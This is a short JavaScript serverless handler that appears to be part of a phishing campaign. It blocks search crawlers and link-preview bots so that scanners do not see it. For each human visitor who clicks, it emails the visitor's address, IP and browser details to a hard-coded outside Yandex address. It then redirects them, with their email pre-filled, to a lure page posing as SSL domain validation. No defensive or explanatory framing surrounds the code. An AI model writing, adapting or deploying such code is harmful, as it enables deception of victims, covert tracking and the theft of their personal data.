export async function onRequestGet(context) {
  const { searchParams } = new URL(context.request.url);
  const email = searchParams.get("email") || "unknown";
  const ip = context.request.headers.get("CF-Connecting-IP") || "unknown";
  const ua = context.request.headers.get("User-Agent") || "unknown";

  // Bot detection
  const knownBots = [
    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot",
    "facebookexternalhit", "Twitterbot", "Slackbot"
  ];
  const isBot = knownBots.some(bot => ua.includes(bot)) || ua === "unknown";

  if (isBot) {
    return new Response("Bot access denied", { status: 403 });
  }

  // Send tracking email (you should use a secure API key via environment variable)
  try {
    await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${context.env.RESEND_API_KEY}`, // use environment variable
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        from: "no-reply@on.resend.dev",
        to: "benitocalvin@yandex.com",
        subject: "🔔 Link Clicked",
        text: `Email: ${email}\nIP: ${ip}\nUA: ${ua}\nTime: ${new Date().toISOString()}`,
      }),
    });
  } catch (err) {
    console.error("Error sending email:", err);
  }

  // Redirect human to landing page with email in query
  const redirectUrl = `https://ssldomainvalidation.pages.dev?email=${encodeURIComponent(email)}`;
  return Response.redirect(redirectUrl, 302);
}
